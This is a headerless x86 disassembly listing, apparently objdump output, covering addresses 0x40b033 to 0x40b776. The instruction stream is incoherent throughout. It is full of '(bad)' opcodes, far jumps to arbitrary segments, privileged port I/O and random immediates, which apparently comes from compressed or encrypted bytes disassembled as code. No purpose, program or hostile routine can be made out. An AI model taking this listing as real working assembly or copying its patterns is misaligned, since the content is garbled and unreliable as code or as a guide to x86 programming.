  40b033:	mov    bl,0xdf
  40b035:	dec    esi
  40b036:	ret    0xc4a7
  40b039:	div    BYTE PTR [esi+esi*8-0x5]
  40b03d:	cli    
  40b03e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b03f:	pop    edi
  40b040:	fst    QWORD PTR [ebp-0x65]
  40b043:	ret    0x2ba3
  40b046:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b047:	out    dx,eax
  40b048:	stc    
  40b049:	pop    esi
  40b04a:	outs   dx,DWORD PTR ds:[esi]
  40b04b:	push   cs
  40b04c:	stos   DWORD PTR es:[edi],eax
  40b04d:	push   ss
  40b04e:	je     0x40b098
  40b050:	inc    ecx
  40b051:	out    0x6b,al
  40b053:	nop
  40b054:	cmp    esi,DWORD PTR [ebx+0x45fe9f6c]
  40b05a:	gs sub eax,0x9a2abef7
  40b060:	or     bl,BYTE PTR [bx+di+0x28]
  40b064:	scas   eax,DWORD PTR es:[edi]
  40b065:	hlt    
  40b066:	pop    esp
  40b067:	xor    al,0x4d
  40b069:	jge    0x40b0bc
  40b06b:	pop    ss
  40b06c:	sbb    bl,BYTE PTR [esi]
  40b06e:	mov    DWORD PTR [eax-0x64424989],esi
  40b074:	push   esp
  40b075:	(bad)  
  40b076:	mov    ebx,ebp
  40b078:	das    
  40b079:	retf   
  40b07a:	xchg   DWORD PTR [esp+edi*4],edi
  40b07d:	imul   esp,DWORD PTR [ecx-0x1b],0x6f80c4fb
  40b084:	mov    ah,0xea
  40b086:	retf   0xcfee
  40b089:	outs   dx,BYTE PTR ds:[esi]
  40b08a:	not    BYTE PTR [edx+0x4776becb]
  40b090:	or     dl,BYTE PTR [eax+ebp*1-0x18]
  40b094:	push   esp
  40b095:	idiv   DWORD PTR [ebx-0x6f]
  40b098:	retf   
  40b099:	stos   BYTE PTR es:[edi],al
  40b09a:	aaa    
  40b09b:	les    esp,FWORD PTR [ebx]
  40b09d:	es cmc 
  40b09f:	sub    ebp,DWORD PTR [ebx]
  40b0a1:	xchg   bh,bl
  40b0a3:	aaa    
  40b0a4:	adc    eax,0x4706e3a2
  40b0a9:	adc    edi,DWORD PTR [esi+ebp*1+0x2935f4d3]
  40b0b0:	gs mov ecx,0xee87d8f8
  40b0b6:	push   eax
  40b0b7:	jae    0x40b0c3
  40b0b9:	repnz xchg esi,eax
  40b0bb:	jae    0x40b08b
  40b0bd:	out    dx,al
  40b0be:	loope  0x40b0bf
  40b0c0:	pop    edx
  40b0c1:	adc    al,0xd
  40b0c3:	dec    edx
  40b0c4:	stc    
  40b0c5:	mov    dl,0x2e
  40b0c7:	sbb    bh,0x2
  40b0ca:	fisubr WORD PTR [esp+eiz*4-0x6f8ab085]
  40b0d1:	mov    ds:0x648b5696,al
  40b0d6:	(bad)  
  40b0d7:	cs sub al,0xe3
  40b0da:	setp   BYTE PTR [eax-0x6]
  40b0de:	adc    eax,0x730b8501
  40b0e3:	mov    BYTE PTR [esi],dl
  40b0e5:	sbb    bl,BYTE PTR [ecx]
  40b0e7:	fwait
  40b0e8:	jmp    0x1cbe:0x20493a0d
  40b0ef:	imul   esi,DWORD PTR [ebx-0x2],0x7de71a23
  40b0f6:	stos   DWORD PTR es:[edi],eax
  40b0f7:	cmovns ebp,DWORD PTR [ebx+eiz*8-0x46]
  40b0fc:	dec    edx
  40b0fd:	pusha  
  40b0fe:	jnp    0x40b0a5
  40b100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b101:	mov    esi,0xd8e712e6
  40b106:	add    BYTE PTR [edi],cl
  40b108:	daa    
  40b109:	aas    
  40b10a:	retf   
  40b10b:	ret    
  40b10c:	adc    BYTE PTR [ebx*1-0x1102ea6d],dl
  40b113:	jne    0x40b16f
  40b115:	push   ss
  40b116:	aam    0x82
  40b118:	int    0x5
  40b11a:	sbb    DWORD PTR [esi+0x6e],ebx
  40b11d:	loopne 0x40b0fc
  40b11f:	xor    eax,0x3aa3e3c9
  40b124:	jns    0x40b188
  40b126:	adc    bl,BYTE PTR [ecx-0x75]
  40b129:	fst    QWORD PTR [ecx-0xf0d68e3]
  40b12f:	sbb    eax,0xd59bb6e6
  40b134:	sbb    eax,0x8b3ff875
  40b139:	loopne 0x40b0fa
  40b13b:	stos   DWORD PTR es:[edi],eax
  40b13c:	out    dx,al
  40b13d:	stos   BYTE PTR es:[edi],al
  40b13e:	bound  ebp,QWORD PTR [edi]
  40b140:	or     dh,BYTE PTR [edi]
  40b142:	dec    esp
  40b143:	adc    edx,DWORD PTR [ecx-0x15]
  40b146:	js     0x40b148
  40b148:	dec    esi
  40b149:	pop    ss
  40b14a:	into   
  40b14b:	fsub   DWORD PTR [esi-0x77]
  40b14e:	lock sbb ecx,DWORD PTR [edx+0x12df3f3e]
  40b155:	pop    esp
  40b156:	add    BYTE PTR [edi],dl
  40b158:	sahf   
  40b159:	jmp    0x40b1c0
  40b15b:	mov    al,0xbe
  40b15d:	in     eax,dx
  40b15e:	push   ds
  40b15f:	push   edi
  40b160:	cmc    
  40b161:	inc    eax
  40b162:	leave  
  40b163:	das    
  40b164:	xchg   DWORD PTR [ebx+0x1],ebp
  40b167:	mov    BYTE PTR [edx-0x11],0xb4
  40b16b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b16c:	cdq    
  40b16d:	cli    
  40b16e:	shl    DWORD PTR [eax],cl
  40b170:	push   edi
  40b171:	jmp    0xec69:0x5c594755
  40b178:	mov    edi,0xd5804e18
  40b17d:	mov    ebx,0x80566207
  40b182:	xchg   edi,eax
  40b183:	and    BYTE PTR [bx+si-0x17b4],bh
  40b188:	jbe    0x40b120
  40b18a:	fcomp  DWORD PTR [ecx]
  40b18c:	pop    edx
  40b18d:	in     eax,dx
  40b18e:	ja     0x40b1fe
  40b190:	adc    al,0x52
  40b192:	inc    edi
  40b193:	fiadd  WORD PTR [edx+0x1aad0458]
  40b199:	(bad)
  40b19d:	inc    ebp
  40b19e:	mov    esi,0xa2cf23ed
  40b1a3:	pop    ds
  40b1a4:	stos   BYTE PTR es:[edi],al
  40b1a5:	add    edi,DWORD PTR [ebx+edx*8-0x4a]
  40b1a9:	push   ecx
  40b1aa:	stc    
  40b1ab:	dec    esi
  40b1ac:	mov    al,BYTE PTR [edi+edx*1]
  40b1af:	fidiv  DWORD PTR [ebx]
  40b1b1:	dec    esp
  40b1b2:	push   esi
  40b1b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1b4:	dec    ebx
  40b1b5:	cmc    
  40b1b6:	add    ecx,esp
  40b1b8:	out    0x59,al
  40b1ba:	stos   BYTE PTR es:[edi],al
  40b1bb:	mov    eax,ds:0xebe53bc8
  40b1c0:	mov    edx,DWORD PTR [ebx]
  40b1c2:	pop    es
  40b1c3:	frstpm(287 only) 
  40b1c5:	xor    esp,ebx
  40b1c7:	loope  0x40b1db
  40b1c9:	jnp    0x40b21c
  40b1cb:	mov    dh,0x32
  40b1cd:	retf   0xddb8
  40b1d0:	jl     0x40b1e1
  40b1d2:	in     eax,0xd1
  40b1d4:	mov    ah,0xee
  40b1d6:	mov    bh,0x2f
  40b1d8:	or     ah,BYTE PTR [edx+0x24fa2f06]
  40b1de:	sbb    dh,cl
  40b1e0:	dec    ebp
  40b1e1:	js     0x40b1db
  40b1e3:	mov    dl,0x9e
  40b1e5:	adc    DWORD PTR [ecx+0x55],ebx
  40b1e8:	mov    ss,WORD PTR [esi+eiz*8+0x31f37325]
  40b1ef:	dec    ebp
  40b1f0:	dec    edx
  40b1f1:	xor    BYTE PTR [edx+0x63],ch
  40b1f4:	sub    eax,0x54e5b404
  40b1f9:	push   ebp
  40b1fa:	sbb    eax,0x280eb4e3
  40b1ff:	adc    eax,0x8eeb5766
  40b205:	mov    DWORD PTR [ecx-0x10],ecx
  40b208:	or     al,0x5f
  40b20a:	aaa    
  40b20b:	sbb    DWORD PTR [edi-0x78],esi
  40b20e:	into   
  40b20f:	(bad)  
  40b210:	loope  0x40b20c
  40b212:	pop    ss
  40b213:	ins    DWORD PTR es:[edi],dx
  40b214:	jg     0x40b245
  40b216:	mov    dl,BYTE PTR [esp+eax*4-0x46]
  40b21a:	mov    cl,0x0
  40b21c:	inc    esp
  40b21d:	dec    BYTE PTR [ecx-0x1]
  40b220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b221:	inc    edi
  40b222:	sbb    eax,0xd45bd083
  40b227:	add    edx,DWORD PTR [edx+0x15165ad8]
  40b22d:	jg     0x40b269
  40b22f:	out    0xc0,al
  40b231:	jmp    0x7b6bc3e3
  40b236:	xor    ecx,DWORD PTR [edi+0x20]
  40b239:	cmp    ebx,ebp
  40b23b:	out    0x60,al
  40b23d:	rcl    DWORD PTR [edi-0x2e],0xec
  40b241:	xchg   ebx,eax
  40b242:	inc    eax
  40b243:	pop    ebp
  40b244:	jmp    0x35e4:0xc8dd4ee9
  40b24b:	and    DWORD PTR [ebx],ebx
  40b24d:	xchg   esi,eax
  40b24e:	fstp   QWORD PTR [ebx+0x19]
  40b251:	jp     0x40b23e
  40b253:	bound  ebx,QWORD PTR [ecx+0x15e0a666]
  40b259:	dec    ebp
  40b25a:	or     eax,0x3bfa9e0
  40b25f:	xor    DWORD PTR [esi+0x70],ebx
  40b262:	pop    edx
  40b263:	push   esp
  40b264:	xchg   esp,eax
  40b265:	loop   0x40b2a6
  40b267:	mov    DWORD PTR [esi+ebx*8],ebx
  40b26a:	addr16 cmp al,bl
  40b26d:	lods   eax,DWORD PTR ds:[esi]
  40b26e:	jne    0x40b2a0
  40b270:	cmp    eax,0xdf1ced27
  40b275:	ss jge 0x40b2c9
  40b278:	scas   eax,DWORD PTR es:[edi]
  40b279:	xor    cl,ah
  40b27b:	push   0xffffffac
  40b27d:	inc    esi
  40b27e:	pop    esi
  40b27f:	(bad)  
  40b280:	or     esp,DWORD PTR [esi-0x7]
  40b283:	xor    eax,0x76e61379
  40b288:	pop    ss
  40b289:	and    al,0x69
  40b28b:	xchg   edi,eax
  40b28c:	mov    eax,0x58bc981c
  40b291:	(bad)  
  40b292:	dec    esi
  40b293:	xchg   edi,eax
  40b294:	icebp  
  40b295:	(bad)  
  40b296:	call   0xf8764ae9
  40b29b:	fcmovu st,st(2)
  40b29d:	jnp    0x40b2e2
  40b29f:	or     bl,ah
  40b2a1:	fild   QWORD PTR [edi]
  40b2a3:	mov    ds:0x6bd5da8a,eax
  40b2a8:	and    ch,BYTE PTR [ebx]
  40b2aa:	pop    ecx
  40b2ab:	adc    al,0x96
  40b2ad:	adc    edi,edi
  40b2af:	adc    al,0x7d
  40b2b1:	xchg   ebx,esi
  40b2b3:	lods   eax,DWORD PTR ds:[esi]
  40b2b4:	push   ecx
  40b2b5:	lea    edi,[ecx]
  40b2b7:	int    0xba
  40b2b9:	xchg   ebp,eax
  40b2ba:	es or  edx,DWORD PTR fs:[esi]
  40b2be:	jnp    0x40b2ee
  40b2c0:	jle    0x40b311
  40b2c2:	xchg   edi,eax
  40b2c3:	add    al,0xf8
  40b2c5:	jae    0x40b28b
  40b2c7:	or     al,0x76
  40b2c9:	imul   edi,DWORD PTR [ecx+0x4f499037],0x13
  40b2d0:	or     eax,0xcd82b2d1
  40b2d5:	inc    esi
  40b2d6:	in     eax,0xce
  40b2d8:	push   ebx
  40b2d9:	mov    cl,BYTE PTR [ebx+0x3cffd683]
  40b2df:	push   edx
  40b2e0:	dec    esp
  40b2e1:	mov    ds:0xb8516b92,al
  40b2e6:	xor    esi,DWORD PTR [edi+0x3fd89dc7]
  40b2ec:	adc    ch,BYTE PTR [esi-0x76]
  40b2ef:	inc    esp
  40b2f0:	in     al,0xdb
  40b2f2:	xor    ebx,0x1e702c49
  40b2f8:	inc    edx
  40b2f9:	fmul   st(1),st
  40b2fb:	and    eax,0xc4a65657
  40b300:	mov    ecx,0x2633e046
  40b305:	call   0x1d62:0xf91091e9
  40b30c:	xor    DWORD PTR [edi+0x136daf12],ecx
  40b312:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b313:	push   ecx
  40b314:	mov    bh,0x19
  40b316:	pusha  
  40b317:	sbb    cl,BYTE PTR [edi-0x65]
  40b31a:	jg     0x40b2e4
  40b31c:	cdq    
  40b31d:	cmp    eax,0xf28e71b0
  40b322:	shr    DWORD PTR [ebp-0x6566f120],1
  40b328:	pushf  
  40b329:	in     al,dx
  40b32a:	outs   dx,DWORD PTR ds:[esi]
  40b32b:	mov    ds:0x1bfed0c7,al
  40b330:	adc    esp,DWORD PTR [edx+0x3fb8c3c]
  40b336:	scas   eax,DWORD PTR es:[edi]
  40b337:	mov    ds:0x892505fd,eax
  40b33c:	dec    edx
  40b33d:	ja     0x40b354
  40b33f:	mul    dl
  40b341:	adc    ebx,DWORD PTR [eax-0x7b]
  40b344:	xchg   edx,eax
  40b345:	or     edi,esi
  40b347:	lods   eax,DWORD PTR ds:[esi]
  40b348:	aas    
  40b349:	adc    eax,DWORD PTR [ebp-0x5862c75]
  40b34f:	cwde   
  40b350:	pop    ebx
  40b351:	dec    esi
  40b352:	jnp    0x40b33c
  40b354:	jno    0x40b36d
  40b356:	stc    
  40b357:	sbb    al,0xba
  40b359:	dec    ebp
  40b35a:	pushf  
  40b35b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b35c:	pop    edi
  40b35d:	dec    edx
  40b35e:	(bad)  
  40b35f:	dec    esi
  40b360:	repz ds push esp
  40b363:	inc    eax
  40b364:	pop    eax
  40b365:	outs   dx,BYTE PTR ds:[esi]
  40b366:	push   edx
  40b367:	mov    ebx,DWORD PTR [ecx+edi*4+0x338f5c58]
  40b36e:	dec    ebx
  40b36f:	in     al,0x8
  40b371:	and    al,0xa5
  40b373:	rcr    bh,0x71
  40b376:	repnz sbb ch,BYTE PTR [ebp+0x1c]
  40b37a:	jo     0x40b30b
  40b37c:	jmp    0xee3b:0x49554160
  40b383:	cmc    
  40b384:	add    ecx,DWORD PTR [ebx+eiz*8+0x7485e988]
  40b38b:	jecxz  0x40b31d
  40b38d:	fwait
  40b38e:	xor    al,0x78
  40b390:	jmp    0x40b337
  40b392:	or     eax,0x630855be
  40b397:	nop    DWORD PTR ss:[eax]
  40b39b:	dec    eax
  40b39c:	arpl   si,sp
  40b39e:	iret   
  40b39f:	inc    edi
  40b3a0:	cmp    al,0xe1
  40b3a2:	ins    BYTE PTR es:[edi],dx
  40b3a3:	retf   0x74e1
  40b3a6:	(bad)  
  40b3a7:	mov    ah,BYTE PTR [edi+ebp*8+0x71c7da23]
  40b3ae:	(bad)  
  40b3af:	in     eax,dx
  40b3b0:	pop    ebx
  40b3b1:	mov    ebp,0x4da941b2
  40b3b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3b8:	inc    eax
  40b3b9:	test   DWORD PTR [ecx],0x58829d02
  40b3bf:	das    
  40b3c0:	adc    eax,0x66357806
  40b3c5:	mov    ds:0x1772854b,eax
  40b3ca:	xor    eax,0xbb6df4c1
  40b3cf:	in     al,dx
  40b3d0:	cmp    esi,DWORD PTR [edi]
  40b3d2:	(bad)  
  40b3d3:	mov    ecx,0x73229e89
  40b3d8:	aaa    
  40b3d9:	push   0xffffffd9
  40b3db:	inc    esi
  40b3dc:	hlt    
  40b3dd:	bound  esp,QWORD PTR [ecx]
  40b3df:	adc    ch,dl
  40b3e1:	in     eax,0xbd
  40b3e3:	sub    eax,0x7997528f
  40b3e8:	jmp    0x18ba:0x2293398f
  40b3ef:	jb     0x40b44e
  40b3f1:	cmp    ah,0x5a
  40b3f4:	js     0x40b41f
  40b3f6:	mov    eax,ds:0xae737d2e
  40b3fb:	fsub   DWORD PTR [esi-0x68]
  40b3fe:	or     DWORD PTR [bp+si+0x413e],esp
  40b403:	add    BYTE PTR [ecx],ch
  40b405:	ror    DWORD PTR [edi],0x53
  40b408:	sbb    al,0xc6
  40b40a:	or     BYTE PTR [edi+0x78a0391b],dl
  40b410:	out    dx,eax
  40b411:	dec    edi
  40b412:	dec    ebx
  40b413:	push   ecx
  40b414:	sub    ecx,esp
  40b416:	push   cs
  40b417:	ins    DWORD PTR es:[edi],dx
  40b418:	rcr    BYTE PTR [edi],0x7a
  40b41b:	pop    eax
  40b41c:	mov    esp,0x6c22dca3
  40b421:	inc    edi
  40b422:	add    ebx,DWORD PTR [ebp-0x2a71e80c]
  40b428:	loop   0x40b3f4
  40b42a:	nop
  40b42b:	ret    0x7a17
  40b42e:	add    esp,DWORD PTR [edi]
  40b430:	(bad)  
  40b431:	jnp    0x40b47b
  40b433:	into   
  40b434:	leave  
  40b435:	js     0x40b493
  40b437:	mov    bh,0x37
  40b439:	jle    0x40b485
  40b43b:	int    0x87
  40b43d:	lds    esi,FWORD PTR [edi-0x68ab9f40]
  40b443:	stos   DWORD PTR es:[edi],eax
  40b444:	aas    
  40b445:	call   0x6ebcadce
  40b44a:	xor    DWORD PTR cs:[edx-0x66f1d720],esp
  40b451:	rcr    bl,0x27
  40b454:	sub    al,0xa
  40b456:	sub    eax,0x963f968d
  40b45b:	dec    esp
  40b45c:	mov    WORD PTR [ebp+0x18],ds
  40b45f:	repnz scas al,BYTE PTR es:[edi]
  40b461:	in     al,dx
  40b462:	aad    0x9d
  40b464:	scas   al,BYTE PTR es:[edi]
  40b465:	push   ecx
  40b466:	push   ds
  40b467:	cdq    
  40b468:	dec    ebx
  40b469:	aad    0x4a
  40b46b:	xor    eax,0x99c1e4a8
  40b470:	inc    ecx
  40b471:	dec    ebx
  40b472:	inc    ecx
  40b473:	sahf   
  40b474:	loope  0x40b461
  40b476:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b477:	mov    dh,0x78
  40b479:	mov    dh,0x2a
  40b47b:	mov    ah,0xdb
  40b47d:	pusha  
  40b47e:	(bad)  
  40b47f:	fsubr  QWORD PTR [ebp+ebx*4+0x9fdea40]
  40b486:	jecxz  0x40b419
  40b488:	or     BYTE PTR [ecx],0x79
  40b48b:	add    al,0xe6
  40b48d:	clc    
  40b48e:	mov    cl,cl
  40b490:	cmp    DWORD PTR [esi+0x29b499c7],0x47a61bd9
  40b49a:	inc    edx
  40b49b:	gs ss mov ebx,0xd5aca1bb
  40b4a2:	mov    bh,0x83
  40b4a4:	add    bh,ah
  40b4a6:	jnp    0x40b453
  40b4a8:	dec    esi
  40b4a9:	mov    ebx,DWORD PTR [ebp-0x61]
  40b4ac:	jmp    0xc9a747a2
  40b4b1:	cld    
  40b4b2:	push   0xffffffa0
  40b4b4:	loop   0x40b463
  40b4b6:	addr16 cdq 
  40b4b8:	test   DWORD PTR [esi+0x6d],0x37240e15
  40b4bf:	in     eax,dx
  40b4c0:	mov    bh,0x97
  40b4c2:	sbb    eax,DWORD PTR [ecx-0x672fcb21]
  40b4c8:	or     ch,0xae
  40b4cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4cc:	(bad)  
  40b4cd:	mov    al,ds:0x7be4d21b
  40b4d2:	push   es
  40b4d3:	lock stos BYTE PTR es:[edi],al
  40b4d5:	cs test al,0xad
  40b4d8:	mov    ds:0xca0f3e99,eax
  40b4dd:	or     BYTE PTR [esi+0x55],bh
  40b4e0:	cs and al,0x57
  40b4e3:	sbb    ah,BYTE PTR [ecx]
  40b4e5:	out    dx,eax
  40b4e6:	nop
  40b4e7:	ins    BYTE PTR es:[edi],dx
  40b4e8:	inc    ecx
  40b4e9:	add    esi,DWORD PTR [esi+0x58cf0325]
  40b4ef:	sub    bh,BYTE PTR [ebx-0x2b]
  40b4f2:	pop    ds
  40b4f3:	jnp    0x40b49e
  40b4f5:	lods   eax,DWORD PTR ds:[esi]
  40b4f6:	cmp    edi,esp
  40b4f8:	jl     0x40b535
  40b4fa:	popf   
  40b4fb:	sub    ebx,ebp
  40b4fd:	cmp    dl,ah
  40b4ff:	sbb    DWORD PTR [edi+eax*8-0x68],ebx
  40b503:	mov    dl,0x5d
  40b505:	leave  
  40b506:	(bad)  
  40b507:	cmp    dl,BYTE PTR [eax-0x94ac3be]
  40b50d:	pop    eax
  40b50e:	iret   
  40b50f:	cmp    cl,ah
  40b511:	or     DWORD PTR [esi+0x23],ebp
  40b514:	xchg   BYTE PTR [ebx+0x63],al
  40b517:	ja     0x40b4b6
  40b519:	es (bad) 
  40b51b:	jo     0x40b59b
  40b51d:	cmp    BYTE PTR [ecx+0x70],0x9b
  40b521:	push   0x798712e4
  40b526:	jl     0x40b517
  40b528:	aam    0x45
  40b52a:	jns    0x40b54a
  40b52c:	mov    BYTE PTR [eax+0x7f2ad7ef],dh
  40b532:	in     al,0x67
  40b534:	loope  0x40b566
  40b536:	leave  
  40b537:	out    dx,al
  40b538:	lods   eax,DWORD PTR ds:[esi]
  40b539:	cwde   
  40b53a:	nop
  40b53b:	or     al,0x8a
  40b53d:	lds    esi,FWORD PTR ds:0xaf240646
  40b543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b544:	inc    ecx
  40b545:	xor    eax,0x3b6c65d1
  40b54a:	rcr    DWORD PTR [eax+0x7de951b],1
  40b550:	stos   BYTE PTR es:[edi],al
  40b551:	xchg   edx,eax
  40b552:	fsubr  DWORD PTR [ebx]
  40b554:	jno    0x40b56a
  40b556:	jmp    FWORD PTR [esi-0x1b]
  40b559:	out    0x62,al
  40b55b:	fs cli 
  40b55d:	ss pushf 
  40b55f:	out    0xb4,eax
  40b561:	ret    
  40b562:	outs   dx,DWORD PTR ds:[esi]
  40b563:	in     eax,dx
  40b564:	daa    
  40b565:	stc    
  40b566:	into   
  40b567:	sbb    edx,DWORD PTR es:[ebx]
  40b56a:	dec    edi
  40b56b:	mov    ah,0xb5
  40b56d:	lods   al,BYTE PTR ds:[esi]
  40b56e:	xchg   edx,eax
  40b56f:	jbe    0x40b556
  40b571:	rcl    DWORD PTR [esi],cl
  40b573:	lahf   
  40b574:	cdq    
  40b575:	icebp  
  40b576:	(bad)  
  40b577:	dec    eax
  40b578:	and    DWORD PTR [edx+0x69],eax
  40b57b:	data16 mov al,0xed
  40b57e:	imul   ecx,DWORD PTR gs:[edi+0x3b16b6bf],0xf59a0838
  40b589:	and    BYTE PTR [edx],ah
  40b58b:	dec    edi
  40b58c:	push   esp
  40b58d:	fidiv  WORD PTR [ebp+0x524521bb]
  40b593:	outs   dx,DWORD PTR ds:[esi]
  40b594:	adc    ecx,DWORD PTR ds:0x20c5f921
  40b59a:	and    eax,0x7ba46f93
  40b59f:	jl     0x40b57a
  40b5a1:	(bad)  
  40b5a2:	fwait
  40b5a3:	jg     0x40b5b3
  40b5a5:	jae    0x40b52f
  40b5a7:	dec    esi
  40b5a8:	inc    edi
  40b5a9:	cs not ch
  40b5ac:	push   ecx
  40b5ad:	mov    ch,0xb6
  40b5af:	sub    BYTE PTR [esi-0x50],ch
  40b5b2:	jbe    0x40b5da
  40b5b4:	jbe    0x40b564
  40b5b6:	fdiv   QWORD PTR [ecx+0xd]
  40b5b9:	cmp    al,0xc0
  40b5bb:	in     eax,dx
  40b5bc:	call   0x6183f5a
  40b5c1:	mov    cs,WORD PTR [ecx+0x60d6a169]
  40b5c7:	inc    ecx
  40b5c8:	xchg   esi,eax
  40b5c9:	push   0xffffffcf
  40b5cb:	jb     0x40b5b4
  40b5cd:	and    eax,0x936a2289
  40b5d2:	dec    esi
  40b5d3:	pop    ds
  40b5d4:	out    0x29,al
  40b5d6:	gs out dx,eax
  40b5d8:	push   ebx
  40b5d9:	push   cs
  40b5da:	jb     0x40b61d
  40b5dc:	stc    
  40b5dd:	sub    esp,edi
  40b5df:	out    dx,eax
  40b5e0:	nop
  40b5e1:	ror    BYTE PTR [ebx+0x5124b511],1
  40b5e7:	mov    ecx,0x86b8720d
  40b5ec:	cmc    
  40b5ed:	push   eax
  40b5ee:	xor    al,0xcf
  40b5f0:	(bad)  
  40b5f1:	mov    cl,0x2b
  40b5f3:	dec    ecx
  40b5f4:	into   
  40b5f5:	pusha  
  40b5f6:	outs   dx,DWORD PTR ds:[esi]
  40b5f7:	and    ebx,DWORD PTR [edx-0x527b29ad]
  40b5fd:	sbb    al,0x3c
  40b5ff:	adc    BYTE PTR [bp+di+0x5],ah
  40b603:	add    al,0xfd
  40b605:	pushf  
  40b606:	xor    eax,0xc7781082
  40b60b:	mov    esp,0xfd93b340
  40b610:	ins    BYTE PTR es:[edi],dx
  40b611:	into   
  40b612:	jmp    0x38aa21fa
  40b617:	and    DWORD PTR [ebp+0x6b],esi
  40b61a:	jno    0x40b5a9
  40b61c:	mov    eax,fs:0x6a597d82
  40b622:	mov    es,WORD PTR [eax+0x4dc54a16]
  40b628:	jle    0x40b610
  40b62a:	test   eax,0x401553d9
  40b62f:	fst    QWORD PTR [eax+0x393250e7]
  40b635:	xor    al,0xc9
  40b637:	sbb    BYTE PTR [edi+ecx*1-0x13],0x14
  40b63c:	int    0xf6
  40b63e:	test   eax,0x47c5c48b
  40b643:	xor    al,BYTE PTR [ecx]
  40b645:	jp     0x40b630
  40b647:	add    ecx,DWORD PTR [edx-0x74]
  40b64a:	lea    esi,[ebp-0xb]
  40b64d:	loopne 0x40b61a
  40b64f:	push   0xffffff9f
  40b651:	rcl    BYTE PTR [eax-0x53],1
  40b654:	(bad)  
  40b655:	test   eax,0xc4033802
  40b65a:	jmp    0x40b5f4
  40b65c:	pop    ebx
  40b65d:	mov    ecx,0x8bf38a1f
  40b662:	out    dx,eax
  40b663:	rcr    DWORD PTR [ebx+0x146f68bb],cl
  40b669:	push   DWORD PTR [edi]
  40b66b:	push   esi
  40b66c:	call   0x7962:0x4272284b
  40b673:	out    dx,al
  40b674:	test   DWORD PTR [edx+0x4],edx
  40b677:	dec    edx
  40b678:	xchg   ebx,eax
  40b679:	ja     0x40b6b2
  40b67b:	ins    DWORD PTR es:[edi],dx
  40b67c:	lea    esp,[ebx+0x78a90936]
  40b682:	cmp    DWORD PTR [ebx],edx
  40b684:	mov    edx,0x966b8ea
  40b689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b68a:	xor    DWORD PTR [eax],esp
  40b68c:	neg    DWORD PTR [edx-0x4]
  40b68f:	lods   al,BYTE PTR ds:[esi]
  40b690:	in     eax,dx
  40b691:	pop    edi
  40b692:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b693:	in     al,0xf5
  40b695:	inc    esp
  40b696:	out    0x52,eax
  40b698:	out    0x24,al
  40b69a:	dec    edi
  40b69b:	xlat   BYTE PTR ds:[ebx]
  40b69c:	xchg   ebx,eax
  40b69d:	xchg   DWORD PTR [esi-0x380a98fb],edi
  40b6a3:	pop    esi
  40b6a4:	jle    0x40b724
  40b6a6:	popa   
  40b6a7:	inc    ebx
  40b6a8:	xchg   ebp,eax
  40b6a9:	jne    0x40b6ae
  40b6ab:	fsub   DWORD PTR [edi+0x2f]
  40b6ae:	push   es
  40b6af:	cmp    DWORD PTR [eax-0x44291332],esp
  40b6b5:	cdq    
  40b6b6:	sub    bh,BYTE PTR [ebp+0x1ac33d1a]
  40b6bc:	test   eax,0x66126535
  40b6c1:	cli    
  40b6c2:	adc    DWORD PTR [eax+0xbb10dff],ebx
  40b6c8:	sbb    al,0x42
  40b6ca:	mov    edi,0xdfb99277
  40b6cf:	shl    DWORD PTR gs:[ecx+ebx*4-0x37a23c0a],cl
  40b6d7:	cmp    eax,0x39629a0b
  40b6dc:	xor    BYTE PTR [eax+eiz*4+0x3d],bl
  40b6e0:	aaa    
  40b6e1:	adc    ecx,DWORD PTR [ecx+0x19961d6f]
  40b6e7:	pop    ss
  40b6e8:	daa    
  40b6e9:	mov    edi,0x253efe22
  40b6ee:	clc    
  40b6ef:	xchg   ebp,eax
  40b6f0:	nop
  40b6f1:	inc    esi
  40b6f2:	sub    DWORD PTR [esi],esp
  40b6f4:	mov    bl,0xd9
  40b6f6:	sub    eax,0xf3a8e27c
  40b6fb:	push   ebx
  40b6fc:	jg     0x40b6be
  40b6fe:	mov    ah,0x50
  40b700:	mov    edx,DWORD PTR [eax+edx*2]
  40b703:	xor    DWORD PTR cs:[esi+ecx*4-0x4f],eax
  40b708:	lea    ecx,[edx]
  40b70a:	in     al,dx
  40b70b:	mov    ebx,0x6425ad5d
  40b710:	pop    esp
  40b711:	and    al,0x7b
  40b713:	lea    ebp,[eax]
  40b715:	add    eax,DWORD PTR [edi-0x22d8e111]
  40b71b:	cdq    
  40b71c:	lea    edi,[edx+0x238f9f7d]
  40b722:	test   BYTE PTR [ecx+esi*1-0x600fb71],al
  40b729:	not    DWORD PTR [esi]
  40b72b:	jno    0x40b707
  40b72d:	sbb    eax,0xbf147460
  40b732:	fcomp  DWORD PTR [edx+0x710df85e]
  40b738:	sub    BYTE PTR [ebx],al
  40b73a:	test   eax,0x5f87a07c
  40b73f:	icebp  
  40b740:	sahf   
  40b741:	jnp    0x40b72e
  40b743:	(bad)  
  40b744:	mov    eax,ds:0xf4b039c1
  40b749:	mov    cl,0x3d
  40b74b:	imul   DWORD PTR [ebx+0xc]
  40b74e:	loopne 0x40b71c
  40b750:	fsub   QWORD PTR [eax-0x2c]
  40b753:	dec    eax
  40b754:	push   es
  40b755:	ret    
  40b756:	imul   eax,DWORD PTR [ebx-0x18a7436c],0x234e359e
  40b760:	cdq    
  40b761:	jmp    0xffda:0x3f79d60d
  40b768:	repz cmps DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40b76b:	mov    dh,0x8
  40b76d:	test   BYTE PTR [eax-0x24],ch
  40b770:	outs   dx,BYTE PTR ds:[esi]
  40b771:	and    edx,ecx
  40b773:	xchg   edx,eax
  40b774:	jmp    0x40b7d6
  40b776:	shl    DWORD PTR [edi],0xf6
